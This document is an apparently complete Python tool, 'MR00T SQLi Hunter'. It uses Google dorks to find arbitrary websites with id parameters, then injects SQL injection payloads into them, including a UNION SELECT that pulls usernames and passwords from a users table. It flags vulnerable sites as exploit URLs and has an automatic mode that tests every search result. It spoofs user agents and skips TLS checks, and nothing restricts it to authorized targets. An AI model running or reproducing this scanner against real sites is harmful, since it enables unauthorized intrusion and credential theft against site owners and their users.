#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import urllib3
import sys
import time
import random
from colorama import Fore, Style, init
import os
import subprocess
import socket
from urllib.parse import urlparse, urljoin, quote

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
BR = Style.BRIGHT
RS = Style.RESET_ALL

# Configuration
MAX_RETRIES = 3
REQUEST_TIMEOUT = 20
DELAY_BETWEEN_REQUESTS = 1
MAX_SEARCH_RESULTS = 5

# User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15'
]

# SQLi Payloads
PAYLOADS = [
    "'", "\"", "`", "'--", "' OR '1'='1", "' OR 1=1--", 
    "\" OR \"\"=\"", "') OR ('1'='1", "' UNION SELECT null,username,password FROM users--",
    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--"
]

def show_banner():
    print(f"""
{BR}{R} ███▄ ▄███▓ ██▓ ███▄    █   ██████  ██▓███   █    ██  ██▓ ███▄ ▄███▓▓█████ 
▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ ▒██    ▒ ▓██░  ██▒ ██  ▓██▒▓██▒▓██▒▀█▀ ██▒▓█   ▀ 
▓██    ▓██░▒██▒▓██  ▀█ ██▒░ ▓██▄   ▓██░ ██▓▒▓██  ▒██░▒██▒▓██    ▓██░▒███   
▒██    ▒██ ░██░▓██▒  ▐▌██▒  ▒   ██▒▒██▄█▓▒ ▒▓▓█  ░██░░██░▒██    ▒██ ▒▓█  ▄ 
▒██▒   ░██▒░██░▒██░   ▓██░▒██████▒▒▒██▒ ░  ░▒▒█████▓ ░██░▒██▒   ░██▒░▒████▒
░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░▓  ░ ▒░   ░  ░░░ ▒░ ░
░  ░      ░ ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░░▒ ░     ░░▒░ ░ ░  ▒ ░░  ░      ░ ░ ░  ░
░      ░    ▒ ░   ░   ░ ░ ░  ░  ░  ░░        ░░░ ░ ░  ▒ ░░      ░      ░   
       ░    ░           ░       ░              ░      ░         ░      ░  ░
                                                                           
{BR}{C}SQL Injection Scanner with Advanced Google Dorking
{BR}{Y}Developed by MR00T Security Team | {G}v2.4 (Final)
{BR}{M}---------------------------------------------------------
    """)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')
    show_banner()

def check_internet():
    try:
        socket.create_connection(("www.google.com", 80), timeout=5)
        return True
    except OSError:
        return False

def install_dependencies():
    print(f"\n{BR}{C}[*] Installing required packages...")
    try:
        subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 
                       'requests', 'beautifulsoup4', 'google', 'colorama', 'urllib3'],
                      check=True)
        print(f"{G}[+] Dependencies installed successfully!")
    except subprocess.CalledProcessError as e:
        print(f"{R}[!] Error installing dependencies: {e}")
        return False
    return True

def google_search(query, num_results=MAX_SEARCH_RESULTS):
    try:
        from googlesearch import search
        results = []
        try:
            # Try with num_results parameter (newer versions)
            for url in search(query, num_results=num_results, 
                            pause=random.uniform(2, 5)):
                results.append(url)
        except TypeError:
            # Fallback to stop parameter (older versions)
            for url in search(query, stop=num_results, 
                            pause=random.uniform(2, 5)):
                results.append(url)
        return results
    except ImportError:
        print(f"{R}[!] Module 'googlesearch' not installed. Install with: {W}pip install google")
        if not install_dependencies():
            return []
    except Exception as e:
        print(f"{R}[!] Google search error: {e}")
        return []
    return []

def is_url_alive(url):
    try:
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        response = requests.head(url, headers=headers, 
                               timeout=REQUEST_TIMEOUT, 
                               verify=False,
                               allow_redirects=True)
        return response.status_code == 200
    except:
        return False

def test_sqli(url):
    for _ in range(MAX_RETRIES):
        try:
            if not is_url_alive(url):
                return False, None, None, None

            parsed = urlparse(url)
            params = requests.utils.parse_qs(parsed.query)
            
            if not params:
                return False, None, None, None
                
            for param in params:
                for payload in PAYLOADS:
                    try:
                        test_url = url.replace(f"{param}=", f"{param}={quote(payload)}")
                        
                        headers = {
                            'User-Agent': random.choice(USER_AGENTS),
                            'Accept': 'text/html,application/xhtml+xml',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Connection': 'keep-alive'
                        }
                        
                        response = requests.get(
                            test_url, 
                            headers=headers, 
                            verify=False, 
                            timeout=REQUEST_TIMEOUT,
                            allow_redirects=False
                        )
                        
                        sqli_errors = [
                            "SQL syntax", "MySQL", "ORA-", "syntax error",
                            "unclosed quotation mark", "quoted string not properly terminated",
                            "SQL Server", "PostgreSQL", "MariaDB", "ODBC", "JDBC",
                            "Microsoft OLE DB Provider", "mysqli_", "pg_", "oci_"
                        ]
                        
                        if any(error.lower() in response.text.lower() for error in sqli_errors):
                            return True, param, payload, test_url
                            
                        time.sleep(DELAY_BETWEEN_REQUESTS)
                        
                    except requests.exceptions.RequestException:
                        continue
                        
            return False, None, None, None
            
        except Exception as e:
            print(f"{R}[!] Error testing {url}: {e}")
            time.sleep(2)
    
    return False, None, None, None

def auto_scan():
    clear_screen()
    print(f"{BR}{C}[+] Automatic SQLi Scanning Mode")
    
    dorks = [
        'inurl:"id="',
        'inurl:".php?id="',
        'inurl:".asp?id="',
        'inurl:"product.php?id="',
        'inurl:"category.php?id="',
        'inurl:"page.php?id="',
        'inurl:"news.php?id="',
        'inurl:"view.php?id="',
        'inurl:"item.php?id="',
        'inurl:"index.php?id="',
        'inurl:"read.php?id="',
        'inurl:"profile.php?id="',
        'inurl:".aspx?id="',
        'inurl:"details.php?id="',
        'inurl:"show.php?id="'
    ]
    
    vulnerable_sites = []
    
    for dork in dorks:
        print(f"\n{BR}{M}[*] Using dork: {Y}{dork}")
        
        results = google_search(dork)
        
        if not results:
            print(f"{R}[-] No results found")
            continue
            
        for url in results:
            print(f"\n{BR}{C}[*] Testing: {Y}{url}")
            vulnerable, param, payload, test_url = test_sqli(url)
            if vulnerable:
                print(f"\n{G}[!] {BR}VULNERABLE{RESET}")
                print(f"{G}Parameter: {param}")
                print(f"{G}Payload: {payload}")
                print(f"{G}Exploit URL: {test_url}")
                vulnerable_sites.append((url, param, payload))
            else:
                print(f"{R}[-] Not vulnerable")
                
            time.sleep(random.uniform(1, 3))
            
    print(f"\n{BR}{G}[+] Scan completed!")
    print(f"{BR}{C}Vulnerable sites found: {len(vulnerable_sites)}")
    
    if vulnerable_sites:
        print(f"\n{BR}{Y}[+] Vulnerable Sites List:")
        for i, (url, param, payload) in enumerate(vulnerable_sites, 1):
            print(f"{W}{i}. {url}")
            print(f"   {C}Parameter: {param}")
            print(f"   {C}Payload: {payload}\n")

def manual_dork_search():
    clear_screen()
    print(f"{BR}{C}[+] Manual Google Dork Search Mode")
    print(f"{BR}{Y}Example: inurl:\"product.php?id=\" site:com")
    
    while True:
        try:
            dork = input(f"\n{BR}{M}MR00T{RS}{B}>> {W}Enter Google Dork (or 'exit'): ").strip()
            if dork.lower() == 'exit':
                break
                
            if not dork:
                continue
                
            print(f"\n{BR}{C}[*] Searching for: {Y}{dork}")
            
            results = google_search(dork)
            if not results:
                print(f"{R}[!] No results found")
                continue
                
            print(f"\n{G}[+] Found {len(results)} potential targets:")
            for i, url in enumerate(results, 1):
                print(f"{W}{i}. {url}")
                
            while True:
                choice = input(f"\n{BR}{M}MR00T{RS}{B}>> {W}Enter number to test (1-{len(results)}), 'all' or 'back': ").strip().lower()
                
                if choice == 'back':
                    break
                elif choice == 'all':
                    for url in results:
                        print(f"\n{BR}{C}[*] Testing: {Y}{url}")
                        vulnerable, param, payload, test_url = test_sqli(url)
                        if vulnerable:
                            print(f"\n{G}[!] {BR}VULNERABLE{RESET}")
                            print(f"{G}Parameter: {param}")
                            print(f"{G}Payload: {payload}")
                            print(f"{G}Exploit URL: {test_url}")
                        else:
                            print(f"{R}[-] Not vulnerable")
                    break
                elif choice.isdigit() and 1 <= int(choice) <= len(results):
                    url = results[int(choice)-1]
                    print(f"\n{BR}{C}[*] Testing: {Y}{url}")
                    vulnerable, param, payload, test_url = test_sqli(url)
                    if vulnerable:
                        print(f"\n{G}[!] {BR}VULNERABLE{RESET}")
                        print(f"{G}Parameter: {param}")
                        print(f"{G}Payload: {payload}")
                        print(f"{G}Exploit URL: {test_url}")
                    else:
                        print(f"{R}[-] Not vulnerable")
                    break
                else:
                    print(f"{R}[!] Invalid choice")
                    
        except KeyboardInterrupt:
            print("\n")
            break
        except Exception as e:
            print(f"{R}[!] Error: {e}")
            continue

def main_menu():
    clear_screen()
    if not check_internet():
        print(f"{R}[!] No internet connection detected!")
        return

    while True:
        print(f"\n{BR}{M}Main Menu:")
        print(f"{BR}{C}1. Automatic SQLi Scan (Predefined Dorks)")
        print(f"{BR}{C}2. Manual Google Dork Search")
        print(f"{BR}{C}3. Install Dependencies")
        print(f"{BR}{C}4. Exit")
        
        try:
            choice = input(f"\n{BR}{M}MR00T{RS}{B}>> {W}Select option: ").strip()
            
            if choice == '1':
                auto_scan()
            elif choice == '2':
                manual_dork_search()
            elif choice == '3':
                install_dependencies()
            elif choice == '4':
                print(f"\n{BR}{Y}[+] Exiting MR00T SQLi Hunter...")
                break
            else:
                print(f"{R}[!] Invalid option")
                
        except KeyboardInterrupt:
            print(f"\n{BR}{Y}[+] Exiting...")
            break
        except Exception as e:
            print(f"{R}[!] Error: {e}")

if __name__ == "__main__":
    try:
        # Check if all dependencies are installed
        try:
            import requests
            from bs4 import BeautifulSoup
            from googlesearch import search
        except ImportError:
            print(f"{R}[!] Some dependencies are missing. Installing...")
            if not install_dependencies():
                sys.exit(1)
                
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{BR}{Y}[+] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[!] Critical Error: {e}")
        sys.exit(1)
